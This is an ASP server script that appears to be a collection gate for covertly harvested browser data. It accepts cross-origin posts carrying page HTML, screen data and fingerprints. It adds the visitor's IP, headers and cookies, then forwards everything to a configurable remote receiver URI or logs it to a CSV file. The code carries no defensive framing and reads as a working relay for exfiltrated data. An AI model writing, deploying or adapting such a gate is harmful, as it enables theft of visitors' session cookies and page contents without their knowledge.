<%
    Response.AddHeader "Access-Control-Allow-Origin", "*"

    Dim DEALER_NAME
    DEALER_NAME = "ASP.DEALER" ' Nombre del dealer
    Dim MODE
    MODE = "SENDER" ' Modo: SAVER o SENDER
    Dim PATH_WRITER
    PATH_WRITER = "C:\tmp\out.csv"
    Dim URI_REZ
    URI_REZ = "RECIVER_URI"

    Dim IP, user_agent
    IP = Request.ServerVariables("REMOTE_ADDR")
    user_agent = Request.ServerVariables("HTTP_USER_AGENT")

    Dim UA
    UA = Replace(user_agent, """", "")

    ' Obtener los parámetros del request
    Dim fpUser, fpBrowser, fpRequest, jsData, encodedPage, encodedScr, TS
    fpUser = Request.Form("u")
    fpBrowser = Request.Form("b")
    fpRequest = Request.Form("r")
    jsData = Request.Form("data")
    encodedPage = Request.Form("code")
    encodedScr = Request.Form("s")
    TS = Timer()

    ' Obtener información del servidor y request
    Dim encoded_data, encoded_req
    encoded_data = Request.ServerVariables
    encoded_req = Request.Form

    ' Referer y Origin
    Dim referer, origin
    referer = Request.ServerVariables("HTTP_REFERER")
    If referer = "" Then referer = "No referer"
    origin = Request.ServerVariables("HTTP_ORIGIN")
    If origin = "" Then origin = "No origin"

    ' Obtener las cookies
    Dim cookies
    Set cookies = Server.CreateObject("Scripting.Dictionary")
    Dim cookie, cookieValue
    For Each cookie In Request.Cookies
        cookies.Add cookie, Request.Cookies(cookie)
    Next

    ' Crear la estructura JSON manualmente
    Dim requestData
    requestData = "{""headers"":""" & encoded_data("ALL_HTTP") & """,""dealer_uri"":""" & origin & """,""merca_uri"":""" & referer & """,""cookies"":" & ConvertCookiesToJSON(cookies) & ",""requestURL"":""" & Request.ServerVariables("URL") & """,""method"":""" & Request.ServerVariables("REQUEST_METHOD") & """}"

    ' Data to send
    Dim data
    data = "DEALER_NAME=" & Server.URLEncode(DEALER_NAME) & "&IP=" & Server.URLEncode(IP) & "&UA=" & Server.URLEncode(UA) & "&FP_USER=" & Server.URLEncode(fpUser) & "&FP_BROWSER=" & Server.URLEncode(fpBrowser) & "&FP_REQUEST=" & Server.URLEncode(fpRequest) & "&HTML_ENCODED=" & Server.URLEncode(encodedPage) & "&SCREEN_ENCODED=" & Server.URLEncode(encodedScr) & "&JS_DATA=" & Server.URLEncode(jsData) & "&encoded_req=" & Server.URLEncode(Base64Encode(requestData))

    ' Modo de envío
    If MODE = "SENDER" Then
        ' Enviar datos a la URI_REZ
        Dim http
        Set http = Server.CreateObject("MSXML2.ServerXMLHTTP")
        http.Open "POST", URI_REZ, False
        http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        http.Send data

        If http.Status = 200 Then
            Response.Write http.responseText
        Else
            Response.Write "Error: " & http.Status
        End If
        Set http = Nothing
    Else
        ' Guardar en archivo CSV
        Dim fs, file
        Set fs = Server.CreateObject("Scripting.FileSystemObject")
        Set file = fs.OpenTextFile(PATH_WRITER, 8, True)
        file.WriteLine(data)
        file.Close
        Set file = Nothing
        Set fs = Nothing
    End If

' Función para convertir cookies en JSON
Function ConvertCookiesToJSON(dict)
    Dim result, key
    result = "{"
    For Each key In dict.Keys
        result = result & """" & key & """:""" & dict.Item(key) & ""","
    Next
    If Len(result) > 1 Then
        result = Left(result, Len(result) - 1) ' Remover la última coma
    End If
    result = result & "}"
    ConvertCookiesToJSON = result
End Function

' Función para codificar en Base64
Function Base64Encode(strData)
    Dim objXML, objNode
    Set objXML = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set objNode = objXML.createElement("Base64Data")
    objNode.dataType = "bin.base64"
    objNode.nodeTypedValue = strData
    Base64Encode = objNode.text
    Set objNode = Nothing
    Set objXML = Nothing
End Function
%>
